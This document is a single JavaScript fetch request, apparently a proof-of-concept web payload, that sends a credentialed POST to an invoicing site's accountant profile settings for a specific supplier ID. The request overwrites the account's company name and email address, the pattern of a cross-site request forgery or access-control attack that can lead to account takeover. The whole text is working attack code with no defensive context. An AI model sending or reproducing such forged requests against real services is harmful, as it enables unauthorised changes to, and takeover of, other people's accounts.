fetch("https://my.billdu.com/accountant.settings/profile?supplierId=1448763", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "save=Save&company=testing&email=bonenes831%40gianes.com&_do=settingsForm-submit",
  credentials: "include"
});
